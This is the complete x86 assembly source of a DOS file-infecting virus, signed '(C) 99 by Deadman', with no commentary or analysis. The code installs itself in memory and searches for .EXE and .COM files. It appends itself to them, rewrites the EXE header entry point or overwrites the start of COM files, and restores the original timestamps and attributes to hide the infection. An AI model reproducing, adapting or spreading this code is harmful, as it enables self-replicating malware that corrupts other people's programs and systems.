   ;                        comment ð
   ;                        absent
   ;                        ð

                           jumps
                           model   tiny
                           .386
                           codeseg
                           org     100h

    start:                 db      24h,21h
                           push    ds es

                           mov     ax,1200h
                           int     2fh
                           cmp     al,0ffh
                           jz      eradie

                           lea     di,eradie
                           mov     ch,0ffh
                           rep     stosw


    eradie:                mov     ah,4ah
                           mov     bh,0ffh
                           int     21h
                           push    bx
                           cmp     bh,3bh
                           jb      exit_vir

                           sub     bx,(msize/16+2)
                           mov     ah,4ah
                           int     21h
                           jc      exit_vir

                           mov     ah,48h
                           mov     bx,(msize/16+1)
                           int     21h

                           sub     ax,10h
                           mov     es,ax
                           push    cs
                           pop     ds
                           mov     di,100h
                           mov     si,di
                           mov     cx,vsize
                           rep     movsb
                           push    cs offset free_mcb
                           push    es offset continue
                           retf

    free_mcb:              mov     ax,es
                           add     ax,10h
                           mov     es,ax
                           mov     ah,49h
                           int     21h

    exit_vir:              pop     bx
                           pop     es ds
                           mov     ah,4ah
                           int     21h

                           mov     ah,1ah
                           mov     dx,80h
                           int     21h

                           cmp     sp,0fffeh
                           je      rest_com

                           mov     ax,es
                           add     ax,10h
                           add     word ptr cs:_cs,ax
                           db      0eah
    _ip                    dw      ?
    _cs                    dw      ?

    rest_com:              mov     di,100h
                           db      0beh
    lsize                  dw      -100h
                           add     si,di
                           mov     cx,vsize
                           mov     bx,100h-2
                           mov     word ptr [bx],0a4f3h
                           jmp     bx

   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ  Whole Virus ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
    continue:              push    cs cs
                           pop     ds es
                           mov     bp,1

                           mov     ah,19h
                           int     21h
                           cmp     al,1
                           jbe     finished

                           lea     si,buffer
                           lea     di,dta

                           mov     ah,1ah
                           mov     dx,di
                           int     21h

                           lea     dx,fspec_exe
    infect:                mov     ah,4eh
                           mov     cx,7
    look:                  int     21h
                           jc      no_more

                           mov     ax,4300h
                           lea     dx,[di+1eh]
                           int     21h
                           push    cx
                           mov     ax,4301h
                           xor     cx,cx
                           int     21h

                           cmp     dword ptr [di+1ah],large vsize
                           jbe     take_next
                           cmp     dword ptr [di+1ah],large 3b000h
                           ja      take_next

                           mov     ax,3d02h
                           int     21h
                           jc      take_next

                           xchg    ax,bx
                           mov     ax,5700h
                           int     21h
                           push    cx dx

                           mov     ah,3fh
                           mov     cx,vsize
                           mov     dx,si
                           int     21h

                           push    dx ax
                           mov     ax,4202h
                           xor     cx,cx
                           cwd
                           int     21h
                           mov     lsize,ax
                           pop     cx dx

                           mov     ax,[si]
                           cmp     ax,'MZ'
                           je      exe_infect
                           cmp     ax,'ZM'
                           je      exe_infect
    ; --- COM INFECT ---
                           cmp     ax,061eh
                           je      close
                           cmp     dword ptr [di+1ah],large 65535-100h-vsize-100h
                           ja      close

                           mov     ah,40h
                           int     21h
                           mov     ax,4200h
                           xor     cx,cx
                           cwd
                           int     21h
                           mov     ah,40h
                           mov     cx,vsize
                           mov     dh,1
                           int     21h
                           jmp     close

    ; --- EXE INFECT ---
    exe_infect:            mov     dx,word ptr [si+14h]
                           mov     ax,word ptr [si+16h]
                           mov     word ptr _ip,dx
                           mov     word ptr _cs,ax
                           cmp     ax,word ptr [si+0eh]
                           je      close
                           add     ax,10h
                           cmp     ax,word ptr [si+0eh]
                           je      close
                           cmp     word ptr [si+0eh+2],vsize+100h
                           jb      close

                           mov     ax,word ptr [si+0eh]
                           add     ax,word ptr [si+08h]
                           mov     cx,10h
                           mul     cx
                           add     ax,word ptr [si+0eh+2]
                           adc     dx,0

                           cmp     dx,word ptr [di+1ah+2]
                           jb      entry
                           ja      close
                           cmp     ax,word ptr [di+1ah]
                           ja      close

    entry:                 mov     ax,word ptr [si+0eh]
                           add     ax,word ptr [si+08h]
                           mov     cx,10h
                           mul     cx
                           xchg    cx,dx
                           xchg    ax,dx
                           mov     ax,4200h
                           int     21h
                           mov     ah,40h
                           mov     cx,vsize
                           mov     dx,100h
                           int     21h
                           xor     cx,ax
                           jnz     close
                           mov     ax,4200h
                           cwd
                           int     21h
                           mov     ax,word ptr [si+0eh]
                           sub     ax,10h
                           mov     word ptr [si+16h],ax
                           mov     word ptr [si+14h],100h
                           mov     ah,40h
                           mov     cx,28
                           mov     dx,si
                           int     21h

    close:                 pop     dx cx
                           mov     ax,5701h
                           int     21h
                           mov     ah,3eh
                           int     21h

    take_next:             pop     cx
                           mov     ax,4301h
                           lea     dx,[di+1eh]
                           int     21h
                           mov     ah,4fh
                           jmp     look

    no_more:               dec     bp
                           jnz     finished

                           lea     dx,fspec_com
                           jmp     infect

    finished:              retf

    fspec_exe              db      '*.EXE',0
    fspec_com              db      '*.COM',0
                           db      '[TIE]',0
                           db      '(C) 99 by Deadman',0

    vsize                  equ     $-start

    dta                    db      43 dup (?)
    buffer                 db      vsize dup (?)

    msize                  equ     $-start
                           end     start
